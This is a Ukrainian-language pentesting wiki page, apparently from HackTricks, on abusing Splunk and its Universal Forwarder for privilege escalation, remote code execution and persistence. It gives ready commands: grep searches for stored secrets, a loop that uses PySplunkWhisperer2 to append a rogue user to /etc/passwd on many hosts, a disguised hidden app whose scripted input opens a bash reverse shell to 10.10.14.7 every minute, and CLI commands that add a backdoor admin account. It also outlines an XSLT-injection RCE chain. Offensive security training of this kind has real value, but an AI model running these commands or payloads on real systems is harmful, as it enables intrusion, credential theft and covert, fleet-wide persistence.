# Splunk LPE and Persistence

Якщо під час **enumerating** машини **внутрішньо** або **зовнішньо** ви виявили **Splunk running** (зазвичай **8000** для web UI і **8089** для management API), дійсні облікові дані часто можна перетворити на **code execution** через встановлення app, scripted inputs або management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Якщо Splunk працює від імені **root**, це часто одразу призводить до **privilege escalation**.<sup>[[1]](#references)</sup>

Якщо вам потрібна лише загальна remote attack surface, enumeration або app-upload RCE path, перегляньте:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Якщо ви **already root**, а Splunk service не слухає лише localhost, ви також можете викрасти **Splunk password hashes**, відновити **encrypted secrets** або розгорнути **malicious app**, щоб зберегти persistence локально чи на кількох forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

Коли ви отримуєте доступ до host, на якому працює Splunk або Splunk Universal Forwarder, це зазвичай найцікавіші paths:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Важливі артефакти:

- **`$SPLUNK_HOME/etc/passwd`**: локальні користувачі Splunk і хеші паролів.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ключ, який Splunk використовує для шифрування секретів, що зберігаються в кількох файлах `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: початковий файл bootstrap адміністратора; корисний у gold images і випадках помилок provisioning. Ігнорується, якщо `etc/passwd` уже існує.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: місце, де зазвичай увімкнені scripted inputs.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** або **`$SPLUNK_HOME/etc/apps/`**: хороші місця для приховування persistent app або перевірки того, що вже розповсюджується.<sup>[[11]](#references)</sup>

## Підсумок експлуатації Splunk Universal Forwarder Agent

Докладнішу інформацію дивіться на [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише підсумок.<sup>[[1]](#references)</sup>

**Огляд exploit:**
Exploit, націлений на Splunk Universal Forwarder (UF), дозволяє зловмисникам, які мають **пароль агента**, виконувати довільний код у системах, де працює агент, потенційно компрометуючи значну частину середовища.<sup>[[1]](#references)</sup>

**Чому це працює:**

- Служба керування UF зазвичай доступна через **TCP 8089**.<sup>[[6]](#references)</sup>
- Зловмисники можуть автентифікуватися в API та вказати forwarder встановити **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- Цей самий primitive можна використовувати локально для **LPE** або віддалено для **RCE**.<sup>[[5]](#references)</sup>
- Публічні інструменти, такі як **SplunkWhisperer2**, автоматично створюють app bundle і можуть адаптувати payloads для Linux targets.<sup>[[5]](#references)</sup>

**Поширені способи відновлення пароля:**

- Облікові дані у відкритому вигляді в документації, скриптах, shares або deployment automation.<sup>[[1]](#references)</sup>
- Хеші паролів у `$SPLUNK_HOME/etc/passwd` із подальшим offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images або залишки provisioning, наприклад `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Вплив:**

- Виконання коду на рівні SYSTEM/root на кожному скомпрометованому host.<sup>[[1]](#references)</sup>
- Розгортання persistent apps, backdoors або ransomware.<sup>[[1]](#references)</sup>
- Вимкнення або підробка telemetry до пересилання даних.<sup>[[1]](#references)</sup>

**Приклад команди для exploitation:**

В оригінальному звіті продемонстровано наведений нижче loop для надсилання payload на кілька forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Доступні публічні експлойти:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence через Scripted Inputs або Malicious Apps

Якщо у вас є **доступ на запис до файлової системи** від імені `root`/`splunk` або автентифікований доступ для встановлення apps, дуже надійним механізмом persistence є розгортання **custom app** зі **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Власна документація Splunk передбачає, що scripted inputs мають розташовуватися в каталозі app і вмикатися з `inputs.conf`.<sup>[[10]](#references)</sup>

Типова структура:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Мінімальний `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Швидкий Linux dropper (з використанням задокументованої структури застосунку):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Примітки:

- Той самий трюк працює з **Universal Forwarder** за допомогою `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers часто маскуються, змінюючи легітимний add-on замість створення очевидно malicious app.<sup>[[2]](#references)</sup>
- На **deployment server** розміщення malicious app у `deployment-apps/` перетворюється на **fleet-wide persistence**, оскільки forwarders опитують сервер, завантажують оновлені apps і часто перезапускаються для їх застосування.<sup>[[11]](#references)[[12]](#references)</sup>

## Крадіжка облікових даних і захоплення облікового запису адміністратора

Якщо ви можете читати локальні файли Splunk, зазвичай є дві основні цілі: відновити доступ **Splunk admin** і відновити **зашифровані облікові дані сервісів**.<sup>[[8]](#references)</sup>

### Хеші паролів і локальні користувачі

Splunk зберігає локальні дані автентифікації в `etc/passwd`. Залежно від розгортання, злам цього файлу може відновити робочі облікові дані для web UI та management API.<sup>[[1]](#references)[[7]](#references)</sup>

Якщо ви вже маєте дійсні облікові дані **admin**, а Splunk використовує **native** backend автентифікації, сам CLI можна використовувати для persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` і зашифровані значення

Splunk використовує `etc/auth/splunk.secret` для захисту конфіденційних значень, що зберігаються в кількох конфігураційних файлах. Якщо вам вдасться викрасти і **secret**, і відповідні **`.conf`-файли**, ви часто зможете відновити або повторно використати:<sup>[[8]](#references)</sup>

- спільні secret-и forwarder/indexer, такі як `pass4SymmKey`
- паролі приватних ключів TLS, такі як `sslPassword`
- облікові дані LDAP bind, такі як `bindDNPassword`

Це може сприяти **lateral movement**, навіть якщо пароль адміністратора Splunk неможливо crack-нути.<sup>[[8]](#references)</sup>

### Зловживання `user-seed.conf`

`user-seed.conf` використовується лише під час першого запуску або коли `etc/passwd` не існує. Через це він менш корисний на активній системі, але дуже цікавий у таких випадках:<sup>[[9]](#references)</sup>

- скомпрометовані шаблони інсталяції
- container images
- unattended provisioning workflows
- appliances, де Splunk автоматично ініціалізується повторно

У таких випадках розміщення `HASHED_PASSWORD`, згенерованого за допомогою `splunk hash-passwd`, дає тихий спосіб відновити admin-доступ після повторного розгортання.<sup>[[9]](#references)</sup>

## Зловживання Splunk Queries

Докладнішу інформацію див. за посиланням [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Корисна нещодавня техніка полягає у зловживанні **user-supplied XSLT** у вразливих версіях Splunk Enterprise, щоб перетворити автентифікований обліковий запис із низькими привілеями на засіб **OS command execution** від імені користувача `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Загальна послідовність:<sup>[[3]](#references)[[4]](#references)</sup>

1. Автентифікуватися у Splunk.
2. Завантажити шкідливий **XSL** через функціональність preview/upload.
3. Змусити Splunk відобразити результати пошуку за допомогою завантаженої stylesheet із каталогу **dispatch**.
4. Використати XSLT payload для запису файлу або запуску виконання через пошуковий pipeline Splunk, наприклад звернувшись до внутрішньої функціональності на кшталт `runshellscript`.

Важливий offensive-висновок полягає в тому, що цей шлях дає **post-auth RCE без потреби в app upload**. У Linux це зазвичай надає доступ до облікового запису **`splunk`**, який усе одно є цінним, оскільки цей користувач часто володіє application tree, може читати secret-и та розміщувати persistent apps, що переживають втрату shell-доступу.<sup>[[3]](#references)[[4]](#references)</sup>

Приклад шляху, який використовується під час exploitation:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Якщо Splunk працює з надмірними привілеями або користувач `splunk` має доступ до небезпечних скриптів, доступних для запису service units чи небезпечних правил `sudo`, це утворює чистий ланцюжок **LPE**.

## References

- [1] [Зловживання Splunk Forwarders для RCE та Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Обережно, TraitorWare: використання Splunk для Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Рекомендації Splunk з безпеки SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Аналіз CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Зміна значень за замовчуванням](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Розгортання захищених паролів на кількох серверах](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Налаштування scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Створення deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Як відбувається оновлення deployment](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Налаштування користувачів за допомогою CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
